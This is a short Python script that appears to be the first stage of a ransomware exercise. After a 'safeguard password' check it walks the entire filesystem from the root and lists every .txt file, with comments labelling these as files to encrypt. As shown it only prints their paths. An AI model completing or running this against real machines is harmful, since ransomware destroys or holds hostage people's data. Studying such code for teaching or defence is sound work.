
import os

# Safeguard password
safeguard = input("Please enter the safeguard password: ")
if safeguard != "start":
    quit()


# File extensions to encrypt

encrypted_ext = ('.txt',)

# Grab all files in the machine

file_paths = []
for root, dirs, files in os.walk("/"):
    for file in files:
        file_path, file_ext = os.path.splitext(root+"\\"+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+"\\"+file)

for f in file_paths:
    print(f)
